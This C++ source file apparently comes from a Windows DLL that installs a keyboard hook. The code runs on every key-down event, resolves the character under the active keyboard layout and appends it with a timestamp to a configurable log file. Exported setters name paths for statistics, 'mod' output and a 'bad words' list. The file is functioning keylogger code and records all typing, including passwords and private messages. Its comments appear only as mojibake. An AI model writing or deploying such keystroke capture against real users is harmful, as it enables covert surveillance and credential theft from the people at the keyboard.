#include "pch.h"
#include "framework.h"
#include "kbhookproc.h"

extern "C" KBHOOKPROC_API void SetStatsPath(std::string newPath) {
	WordOfVkeys::GetInstance()->SetWhereToWriteKeys(newPath);
}
extern "C" KBHOOKPROC_API void SetModPath(std::string newPath) {
	WordOfVkeys::GetInstance()->SetWhereToWriteWords(newPath);
}
extern "C" KBHOOKPROC_API void SetBadWordsPath(std::string newPath) {
	WordOfVkeys::GetInstance()->SetWhereToReadBadWords(newPath);
}

extern "C" KBHOOKPROC_API LRESULT KeyboardProc(
	_In_ int    code,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
)
{
	WordOfVkeys* currWorld = WordOfVkeys::GetInstance();

	if (code < 0 ||
		currWorld->IsUnPrintableKey(wParam) ||
		!currWorld->IsKeyDownState(lParam)) 
	{
		return CallNextHookEx(NULL, code, wParam, lParam);
	}

	currWorld->AddVkeyToWord(wParam);

	return CallNextHookEx(NULL, code, wParam, lParam);
}

WordOfVkeys* WordOfVkeys::_instance = nullptr;

bool WordOfVkeys::IsUnPrintableKey(WPARAM vkey)
{
	if (
		vkey == VK_CONTROL ||
		vkey == VK_MENU ||
		vkey == VK_CAPITAL ||
		vkey == VK_SHIFT)
		return true;

	return false;
}
bool WordOfVkeys::IsKeyDownState(LPARAM vkeyAttr)
{
	return vkeyAttr & 1 << 31;
}

void WordOfVkeys::AddVkeyToWord(WPARAM vkey)
{
	//��������� ���������� � �������� ������
	auto kbLayout = GetCurrentLayout();
	auto keySymb = GetCharSymbFromVkey(vkey, kbLayout);
	std::string currTime = GetCurrTimeBuff();

	std::string info = "'" + std::string(1, keySymb) + "' : " + currTime;
	WriteTofile(_whereToWriteKeys, info);
}

HKL WordOfVkeys::GetCurrentLayout() {
	//�������� �����
	DWORD processId;
	DWORD activeThread = GetWindowThreadProcessId(
		GetForegroundWindow(), &processId);

	//��������� ���������� � �������� ������
	auto kbLayout = GetKeyboardLayout(activeThread);

	return kbLayout;
}
std::string WordOfVkeys::GetCurrTimeBuff() {
	//�������� ������� �����
	auto start = std::chrono::system_clock::now();

	std::time_t end_time = std::chrono::system_clock::to_time_t(start);
	char timeBuff[50];
	ctime_s(timeBuff, sizeof(timeBuff), &end_time);

	return timeBuff;
}
char WordOfVkeys::GetCharSymbFromVkey(WPARAM vkey, HKL kbLayout) {

	UINT uScanCode = MapVirtualKeyEx(vkey, 0, kbLayout);
	BYTE keysState[256];
	WORD keySymbol;
	//��������� ���� ������
	GetKeyboardState(keysState);

	//������� vk_key ��� scan_code � ������ � ������ ��������� (������� �� �����������!)
	ToAsciiEx(vkey, uScanCode, keysState, &keySymbol, 0, kbLayout);
	char charSymbol = char(keySymbol);

	//��������� ���� � ������� (��� ��������)
	if ((GetAsyncKeyState(VK_SHIFT) && !GetAsyncKeyState(VK_CAPITAL)) ||
		(!GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_CAPITAL)))
		charSymbol = toupper(charSymbol);

	return charSymbol;
}

void WordOfVkeys::WriteTofile(std::string fileName, std::string info) {
	std::ofstream ofs(fileName, std::ofstream::out | std::ofstream::app);
	ofs << info;
	ofs.close();
}